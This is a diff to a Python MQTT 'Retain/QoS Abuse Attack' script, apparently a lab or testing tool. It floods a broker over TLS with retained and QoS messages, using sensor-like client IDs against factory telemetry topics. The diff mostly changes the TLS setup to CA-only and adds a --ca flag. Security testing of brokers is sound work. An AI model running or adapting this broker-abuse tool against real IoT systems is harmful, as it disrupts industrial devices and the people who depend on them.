@@ -1,5 +1,4 @@
-
-
+#!/usr/bin/env python3
 import paho.mqtt.client as mqtt
 import json
 import time
@@ -14,14 +13,14 @@ from datetime import datetime, timezone
 def make_client_id(device_base: str, index: int,
                    prefix: str = "retain", suffix: str = "qos_replayer",
                    sep: str = "-") -> str:
-
-
+    # Logic tạo ID giữ nguyên
     return f"{prefix}{sep}{suffix}"
 
 class RetainQoSAbuseAttackTLS:
-    def __init__(self, broker_host="localhost", broker_port=8884):
+    def __init__(self, broker_host="localhost", broker_port=8884, ca_certs="certs/ca-cert.pem"):
         self.broker_host = broker_host
         self.broker_port = broker_port
+        self.ca_certs = ca_certs
         self.attack_stats = {
             "retain_messages_sent": 0,
             "qos_messages_sent": 0,
@@ -33,16 +32,19 @@ class RetainQoSAbuseAttackTLS:
         }
 
     def create_client(self, client_id, username=None, password=None):
-
         try:
             client = mqtt.Client(client_id=client_id, protocol=mqtt.MQTTv311)
 
-            client.tls_set(ca_certs="certs/cacert.pem",
-                          certfile="certs/clientcert.pem",
-                          keyfile="certs/client-key.pem",
-                          cert_reqs=ssl.CERT_REQUIRED,
-                          tls_version=ssl.PROTOCOL_TLS,
-                          ciphers=None)
+            # Logic TLS chỉ dùng CA Certificate
+            if self.ca_certs and os.path.exists(self.ca_certs):
+                client.tls_set(ca_certs=self.ca_certs,
+                              cert_reqs=ssl.CERT_REQUIRED,
+                              tls_version=ssl.PROTOCOL_TLS_CLIENT,
+                              ciphers=None)
+            else:
+                # Nếu không tìm thấy file CA, in cảnh báo và thử dùng mặc định hệ thống
+                print(f" Warning: CA file {self.ca_certs} not found. Using system default.")
+                client.tls_set(cert_reqs=ssl.CERT_REQUIRED, tls_version=ssl.PROTOCOL_TLS_CLIENT)
 
             if username and password:
                 client.username_pw_set(username, password)
@@ -53,7 +55,6 @@ class RetainQoSAbuseAttackTLS:
             return None
 
     def _derive_device_base_from_topic(self, topic: str) -> str:
-
         try:
             if not topic:
                 return "sensor_unknown"
@@ -69,7 +70,6 @@ class RetainQoSAbuseAttackTLS:
             return "sensor_unknown"
 
     def _get_client_id_for_worker(self, worker_id: int, topics: list, fallback_types=None):
-
         if fallback_types is None:
             fallback_types = ["sensor_cooler", "sensor_fanspeed", "sensor_motion"]
 
@@ -91,7 +91,6 @@ class RetainQoSAbuseAttackTLS:
             return make_client_id(device_base, worker_id + 1)
 
     def retain_abuse_worker(self, worker_id, topics, num_messages=100, delay_ms=100, username=None, password=None):
-
         client_id = self._get_client_id_for_worker(worker_id, topics)
         client = self.create_client(client_id, username, password)
 
@@ -100,7 +99,6 @@ class RetainQoSAbuseAttackTLS:
             return
 
         try:
-
             client.connect(self.broker_host, self.broker_port, 60)
             client.loop_start()
 
@@ -151,7 +149,6 @@ class RetainQoSAbuseAttackTLS:
                 pass
 
     def qos_abuse_worker(self, worker_id, topics, num_messages=100, delay_ms=100, username=None, password=None):
-
         client_id = self._get_client_id_for_worker(worker_id, topics)
         client = self.create_client(client_id, username, password)
 
@@ -160,7 +157,6 @@ class RetainQoSAbuseAttackTLS:
             return
 
         try:
-
             client.connect(self.broker_host, self.broker_port, 60)
             client.loop_start()
 
@@ -214,7 +210,6 @@ class RetainQoSAbuseAttackTLS:
                 pass
 
     def mixed_abuse_worker(self, worker_id, topics, num_messages=100, delay_ms=100, username=None, password=None):
-
         client_id = self._get_client_id_for_worker(worker_id, topics)
         client = self.create_client(client_id, username, password)
 
@@ -223,7 +218,6 @@ class RetainQoSAbuseAttackTLS:
             return
 
         try:
-
             client.connect(self.broker_host, self.broker_port, 60)
             client.loop_start()
 
@@ -281,7 +275,6 @@ class RetainQoSAbuseAttackTLS:
 
     def launch_attack(self, attack_type="mixed", num_workers=2, messages_per_worker=100,
                      delay_ms=100, topics=None, username=None, password=None):
-
         if topics is None or len(topics) == 0:
             topics = [
                 "factory/tenantA/Temperature/telemetry",
@@ -293,7 +286,7 @@ class RetainQoSAbuseAttackTLS:
                 "security/test/qos"
             ]
 
-        print(f" Starting Retain/QoS Abuse Attack (TLS)")
+        print(f" Starting Retain/QoS Abuse Attack (TLS - CA Hardcoded)")
         print(f"   Attack type: {attack_type}")
         print(f"   Workers: {num_workers}")
         print(f"   Messages per worker: {messages_per_worker}")
@@ -341,7 +334,6 @@ class RetainQoSAbuseAttackTLS:
         self.print_attack_stats()
 
     def print_attack_stats(self):
-
         duration = (self.attack_stats["end_time"] - self.attack_stats["start_time"]) if self.attack_stats["end_time"] and self.attack_stats["start_time"] else 0
         total_messages = self.attack_stats["retain_messages_sent"] + self.attack_stats["qos_messages_sent"]
 
@@ -363,7 +355,7 @@ class RetainQoSAbuseAttackTLS:
             print(f"Messages per second: {total_messages/duration:.1f}")
 
 def main():
-    parser = argparse.ArgumentParser(description="MQTT Retain/QoS Abuse Attack (TLS)")
+    parser = argparse.ArgumentParser(description="MQTT Retain/QoS Abuse Attack (TLS CA Only)")
     parser.add_argument("--broker", default="localhost", help="MQTT broker host")
     parser.add_argument("--port", type=int, default=8884, help="MQTT broker port")
     parser.add_argument("--type", choices=["retain", "qos", "mixed"], default="mixed",
@@ -374,12 +366,16 @@ def main():
     parser.add_argument("--topics", nargs="+", help="Custom target topics")
     parser.add_argument("--username", help="MQTT username for authentication")
     parser.add_argument("--password", help="MQTT password for authentication")
+    
+    # Gán cứng mặc định cho CA
+    parser.add_argument("--ca", default="certs/ca-cert.pem", help="Path to CA certificate file (Default: certs/ca-cert.pem)")
 
     args = parser.parse_args()
 
     attack = RetainQoSAbuseAttackTLS(
         broker_host=args.broker,
-        broker_port=args.port
+        broker_port=args.port,
+        ca_certs=args.ca
     )
 
     attack.launch_attack(
